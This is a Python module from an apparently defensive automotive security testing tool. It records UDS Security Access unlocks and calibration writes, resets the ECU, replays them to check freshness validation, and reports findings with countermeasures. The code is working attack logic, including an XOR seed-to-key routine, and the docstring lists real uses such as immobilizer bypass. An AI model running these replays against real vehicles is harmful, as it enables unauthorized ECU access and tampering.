"""
attacks/replay_attack.py
=========================
UDS Replay Attack Module.

Records valid UDS sequences then replays them to test
whether the ECU validates message freshness.

What is a replay attack?
  Record a legitimate UDS sequence (e.g. Security Access unlock).
  Replay it later — after ECU reset, different session, or time delay.
  If ECU accepts the replayed sequence → no freshness validation.

Real-world automotive replay attacks:
  1. Keyless entry replay: Record door unlock CAN sequence → replay to open car
  2. Immobilizer bypass: Record start sequence → replay to start without key
  3. SA session replay: Record SA unlock → replay after reset to skip SA
  4. Programming replay: Record firmware update sequence → replay malicious firmware

What should protect against replay:
  For CAN: SecOC freshness counter (AUTOSAR SecOC module)
  For UDS SA: New seed generated each session (should be unpredictable)
  For DoIP: TLS session prevents replay at transport layer

This module tests specifically:
  1. SA sequence replay — does seed change after reset?
  2. Session sequence replay — does session re-establishment require full auth?
  3. Write sequence replay — does WDBI accept replayed frames?

ISO/SAE 21434:
  Clause 9 — Threat scenario: Replay attack on diagnostic interface
  Clause 11 — Countermeasure: SecOC / TLS / freshness counters
"""

import time
import struct
import logging
from dataclasses import dataclass, field
from config import *

log = logging.getLogger("ReplayAttack")


# ── Recorded Session ──────────────────────────────────────────────────────────

@dataclass
class RecordedMessage:
    """Single recorded UDS message."""
    request:       bytes
    response:      bytes | None
    timestamp:     float
    is_positive:   bool
    description:   str


@dataclass
class RecordedSession:
    """A complete recorded UDS session for replay."""
    messages:       list[RecordedMessage]
    session_type:   int
    sa_unlocked:    bool
    recorded_at:    float = field(default_factory=time.time)
    description:    str = ""


@dataclass
class ReplayResult:
    """Result of a replay attempt."""
    replay_type:         str
    original_session:    RecordedSession
    replayed_messages:   list[RecordedMessage]
    replay_accepted:     bool    # Did ECU accept the replayed sequence?
    freshness_validated: bool    # Did ECU reject due to freshness?
    vulnerability_found: bool    # Is this a real vulnerability?
    severity:            str
    description:         str
    iso_ref:             str
    countermeasure:      str


# ── Replay Attack Engine ──────────────────────────────────────────────────────

class ReplayAttackEngine:
    """
    Records and replays UDS sequences to test freshness validation.

    Three replay scenarios:
      1. SA Sequence Replay — replay Security Access after reset
      2. Session Sequence Replay — replay session establishment
      3. Write Sequence Replay — replay WDBI write commands
    """

    def __init__(self):
        self.recorded_sessions: list[RecordedSession] = []
        self.results:           list[ReplayResult]    = []

    def run_all(self, client) -> list[ReplayResult]:
        """
        Run all replay attack scenarios.

        Args:
            client: UDSClient or DoIPClient

        Returns:
            List of ReplayResult for each scenario tested
        """
        print(f"\n  [Replay Attack] Starting replay attack analysis\n")

        results = []

        # Scenario 1: SA Sequence Replay
        print("  [1/3] SA Sequence Replay Test")
        r1 = self.test_sa_replay(client)
        results.append(r1)
        self._print_result(r1)

        # Scenario 2: Session Sequence Replay
        print("  [2/3] Session Sequence Replay Test")
        r2 = self.test_session_replay(client)
        results.append(r2)
        self._print_result(r2)

        # Scenario 3: Write Data Replay
        print("  [3/3] Write Data Replay Test")
        r3 = self.test_write_replay(client)
        results.append(r3)
        self._print_result(r3)

        self.results = results
        return results

    # ── Scenario 1: SA Replay ─────────────────────────────────────────────────

    def test_sa_replay(self, client) -> ReplayResult:
        """
        Test: Record successful SA unlock sequence, ECU reset, replay SA.

        Vulnerability: ECU accepts replayed SA key after reset.
        This means the seed is predictable or the key is accepted without
        a fresh seed-key exchange.

        Expected behaviour (secure): ECU rejects replayed key because
        a new seed was generated after reset → old key is invalid.

        Detected vulnerability: ECU accepts old key → seed is predictable
        or key validation doesn't require prior seed exchange.
        """
        print("    Recording SA unlock sequence...")

        # Phase 1: Record a successful SA unlock
        recorded = self._record_sa_sequence(client)
        if not recorded or not recorded.sa_unlocked:
            return self._unavailable_result(
                "sa_replay",
                "Could not record successful SA unlock for replay test"
            )

        print(f"    Recorded {len(recorded.messages)} messages. SA unlocked: {recorded.sa_unlocked}")
        print("    Resetting ECU...")

        # Phase 2: Reset ECU
        reset_sent = self._send_ecu_reset(client)
        if not reset_sent:
            log.warning("ECU reset may have failed")

        time.sleep(0.2)   # Allow ECU to restart

        print("    Replaying SA sequence after reset...")

        # Phase 3: Replay the exact same SA sequence
        replayed = self._replay_sequence(client, recorded)

        # Phase 4: Check if SA unlock was accepted
        # Try to use a SA-protected service to verify if unlock persisted
        sa_accepted = self._verify_sa_still_unlocked(client)

        vulnerability = sa_accepted

        return ReplayResult(
            replay_type         = "sa_replay",
            original_session    = recorded,
            replayed_messages   = replayed,
            replay_accepted     = sa_accepted,
            freshness_validated = not sa_accepted,
            vulnerability_found = vulnerability,
            severity            = "CRITICAL" if vulnerability else "INFO",
            description         = (
                "SA sequence replay ACCEPTED after ECU reset — "
                "seed is predictable or freshness not validated. "
                "Attacker can record SA sequence and replay after reset "
                "to bypass Security Access authentication."
                if vulnerability else
                "SA sequence replay correctly rejected after ECU reset. "
                "ECU generates new seed on reset — freshness validated."
            ),
            iso_ref = (
                "ISO 14229-1 §10.4.3 — Seed must be unpredictable; "
                "ISO/SAE 21434 Clause 11 — SecOC freshness counter"
            ),
            countermeasure = (
                "1. Implement Dcm_GetSeed() using HSM RNG → unpredictable seed\n"
                "2. Invalidate SA state on every ECU reset (already in AUTOSAR DCM)\n"
                "3. Use session-specific freshness counter in seed derivation\n"
                "4. Consider implementing 0x29 (Authentication) service "
                "with PKI-based challenge-response (replaces 0x27)"
            ),
        )

    # ── Scenario 2: Session Replay ────────────────────────────────────────────

    def test_session_replay(self, client) -> ReplayResult:
        """
        Test: Record session establishment, reset, replay session messages.

        Tests whether the ECU correctly validates session prerequisites
        when messages are replayed out of context.
        """
        print("    Recording session establishment sequence...")

        # Record: DSC extended → SA seed → SA key → verify
        session_messages = []

        # DSC extended
        resp = self._send_and_record(client,
                                      bytes([SID_DSC, SESSION_EXTENDED]),
                                      "DSC extended session")
        if resp:
            session_messages.append(resp)

        # SA seed
        resp = self._send_and_record(client,
                                      bytes([SID_SA, 0x01]),
                                      "SA request seed")
        if resp:
            session_messages.append(resp)
            # Extract seed to compute key
            if resp.is_positive and resp.response is not None:
                rb = resp.response
                if len(rb) >= 6:
                    seed = rb[2:6]
                    key  = self._compute_key(seed)
                    key_resp = self._send_and_record(
                        client,
                        bytes([SID_SA, 0x02]) + key,
                        "SA send correct key"
                    )
                    if key_resp:
                        session_messages.append(key_resp)

        recorded = RecordedSession(
            messages    = session_messages,
            session_type= SESSION_EXTENDED,
            sa_unlocked = any(m.description == "SA send correct key" and
                              m.is_positive for m in session_messages),
            description = "Extended session + SA unlock",
        )

        # Reset ECU
        self._send_ecu_reset(client)
        time.sleep(0.2)

        print("    Replaying session sequence after reset...")

        # Replay all recorded messages
        replayed = []
        replay_positive_count = 0
        for msg in recorded.messages:
            replayed_msg = self._replay_single(client, msg)
            if replayed_msg:
                replayed.append(replayed_msg)
                if replayed_msg.is_positive:
                    replay_positive_count += 1

        # Session replay is partially expected (DSC is always valid)
        # Vulnerability: if SA key replay was accepted (seed unchanged after reset)
        sa_key_replayed = any(
            m.description == "SA send correct key" and m.is_positive
            for m in replayed
        )

        return ReplayResult(
            replay_type         = "session_replay",
            original_session    = recorded,
            replayed_messages   = replayed,
            replay_accepted     = sa_key_replayed,
            freshness_validated = not sa_key_replayed,
            vulnerability_found = sa_key_replayed,
            severity            = "HIGH" if sa_key_replayed else "INFO",
            description         = (
                f"Session replay: {replay_positive_count}/{len(replayed)} "
                f"messages accepted. SA key replay: {'VULNERABLE' if sa_key_replayed else 'SECURE'}."
            ),
            iso_ref = "ISO 14229-1 §10.4 — SA freshness requirement",
            countermeasure = (
                "ECU reset must generate new seed. "
                "Old key must be invalid after reset. "
                "Implement HSM-backed RNG for seed generation."
            ),
        )

    # ── Scenario 3: Write Replay ──────────────────────────────────────────────

    def test_write_replay(self, client) -> ReplayResult:
        """
        Test: Record a WDBI write sequence, replay it in a new session.

        Vulnerability: WDBI accepted without re-authentication.
        If attacker records a valid write sequence during a legitimate
        service session, they can replay it later to overwrite data.
        """
        print("    Recording write sequence...")

        write_messages = []

        # Setup: enter session + SA
        self._enter_extended_session(client)
        sa_unlocked = self._unlock_sa(client)

        if not sa_unlocked:
            return self._unavailable_result(
                "write_replay",
                "Could not unlock SA for write replay test"
            )

        # Record a WDBI write (write to calibration DID 0x0200)
        write_payload = bytes([SID_WDBI, 0x02, 0x00,
                                0xAA, 0xBB, 0xCC, 0xDD,
                                0xEE, 0xFF, 0x11, 0x22])
        write_resp = self._send_and_record(client, write_payload,
                                            "WDBI write calibration data")
        if write_resp:
            write_messages.append(write_resp)

        recorded = RecordedSession(
            messages     = write_messages,
            session_type = SESSION_EXTENDED,
            sa_unlocked  = True,
            description  = "WDBI write with SA unlocked",
        )

        original_write_accepted = write_resp.is_positive if write_resp else False

        # Reset — clears SA state
        self._send_ecu_reset(client)
        time.sleep(0.2)

        # Replay write WITHOUT re-authenticating
        print("    Replaying write WITHOUT SA unlock...")
        replayed_write = self._replay_single(client, write_resp) \
                         if write_resp else None

        write_replayed = replayed_write.is_positive if replayed_write else False

        return ReplayResult(
            replay_type         = "write_replay",
            original_session    = recorded,
            replayed_messages   = [replayed_write] if replayed_write else [],
            replay_accepted     = write_replayed,
            freshness_validated = not write_replayed,
            vulnerability_found = write_replayed,
            severity            = "CRITICAL" if write_replayed else "INFO",
            description         = (
                "WDBI replay accepted without re-authentication — "
                "write commands do not require fresh SA unlock. "
                "Attacker can replay recorded write commands to overwrite ECU data."
                if write_replayed else
                "WDBI replay correctly rejected — "
                "write service requires active SA unlock."
            ),
            iso_ref = (
                "ISO 14229-1 §9.7 — WDBI requires SA; "
                "ISO/SAE 21434 Clause 11 — Data integrity"
            ),
            countermeasure = (
                "SA unlock state must be reset on ECU reset. "
                "WDBI must check SA state at time of request — "
                "not at session establishment time."
            ),
        )

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _record_sa_sequence(self, client) -> RecordedSession | None:
        """Record a complete successful SA unlock sequence."""
        messages = []
        sa_unlocked = False

        # Enter extended session
        resp = self._send_and_record(client,
                                      bytes([SID_DSC, SESSION_EXTENDED]),
                                      "DSC extended")
        if resp:
            messages.append(resp)

        # Request seed
        resp = self._send_and_record(client,
                                      bytes([SID_SA, 0x01]),
                                      "SA request seed")
        if not resp or not resp.is_positive:
            return None
        messages.append(resp)

        # Compute and send key
        if resp.response and len(resp.response) >= 6:
            seed = resp.response[2:6]
            key  = self._compute_key(seed)
            key_resp = self._send_and_record(
                client,
                bytes([SID_SA, 0x02]) + key,
                "SA send key"
            )
            if key_resp:
                messages.append(key_resp)
                sa_unlocked = key_resp.is_positive

        return RecordedSession(
            messages    = messages,
            session_type= SESSION_EXTENDED,
            sa_unlocked = sa_unlocked,
            description = "SA unlock sequence",
        )

    def _replay_sequence(self, client,
                          session: RecordedSession) -> list[RecordedMessage]:
        """Replay all messages in a recorded session."""
        replayed = []
        for msg in session.messages:
            result = self._replay_single(client, msg)
            if result:
                replayed.append(result)
        return replayed

    def _replay_single(self, client,
                        msg: RecordedMessage | None) -> RecordedMessage | None:
        """Replay a single recorded message."""
        if not msg:
            return None
        resp = self._send(client, msg.request)
        return RecordedMessage(
            request     = msg.request,
            response    = resp,
            timestamp   = time.time(),
            is_positive = self._is_positive(msg.request, resp),
            description = f"REPLAYED: {msg.description}",
        )

    def _send_and_record(self, client, request: bytes,
                          description: str) -> RecordedMessage | None:
        """Send a UDS request and record the result."""
        response = self._send(client, request)
        return RecordedMessage(
            request     = request,
            response    = response,
            timestamp   = time.time(),
            is_positive = self._is_positive(request, response),
            description = description,
        )

    def _send(self, client, request: bytes) -> bytes | None:
        """Send raw bytes via client (handles both CAN and DoIP clients)."""
        try:
            if hasattr(client, 'send_raw'):
                resp = client.send_raw(request)
                return resp.response_bytes if resp else None
            else:
                return client.send_uds(request)
        except Exception as e:
            log.debug(f"Send error: {e}")
            return None

    def _is_positive(self, request: bytes, response: bytes | None) -> bool:
        if not response or len(response) < 1:
            return False
        sid = request[0] if request else 0
        return response[0] == sid + POSITIVE_RESPONSE_OFFSET

    def _send_ecu_reset(self, client) -> bool:
        resp = self._send(client, bytes([SID_ER, 0x01]))
        return resp is not None

    def _enter_extended_session(self, client) -> bool:
        resp = self._send(client, bytes([SID_DSC, SESSION_EXTENDED]))
        return self._is_positive(bytes([SID_DSC]), resp)

    def _unlock_sa(self, client) -> bool:
        """Perform full SA unlock sequence."""
        seed_resp = self._send(client, bytes([SID_SA, 0x01]))
        if not seed_resp or len(seed_resp) < 6:
            return False
        seed = seed_resp[2:6]
        key  = self._compute_key(seed)
        key_resp = self._send(client, bytes([SID_SA, 0x02]) + key)
        return self._is_positive(bytes([SID_SA]), key_resp)

    def _verify_sa_still_unlocked(self, client) -> bool:
        """Check if SA unlock persisted by trying a protected service."""
        resp = self._send(client, bytes([SID_RDBI, 0x02, 0x00]))
        return self._is_positive(bytes([SID_RDBI]), resp)

    def _compute_key(self, seed: bytes) -> bytes:
        """Compute key from seed using known XOR algorithm."""
        seed_int = struct.unpack(">I", seed[:4])[0]
        key_int  = seed_int ^ SA_KEY_MASK
        return struct.pack(">I", key_int)

    def _print_result(self, result: ReplayResult):
        """Print replay attack result."""
        col = "\033[91m" if result.vulnerability_found else "\033[92m"
        status = "VULNERABLE" if result.vulnerability_found else "SECURE"
        print(f"    Result: {col}{status}\033[0m — {result.severity}")
        print(f"    {result.description[:80]}")
        if result.vulnerability_found:
            print(f"    Fix: {result.countermeasure.split(chr(10))[0]}")
        print()

    def _unavailable_result(self, replay_type: str,
                             reason: str) -> ReplayResult:
        return ReplayResult(
            replay_type         = replay_type,
            original_session    = RecordedSession([], SESSION_DEFAULT, False),
            replayed_messages   = [],
            replay_accepted     = False,
            freshness_validated = True,
            vulnerability_found = False,
            severity            = "INFO",
            description         = f"Test skipped: {reason}",
            iso_ref             = "N/A",
            countermeasure      = "N/A",
        )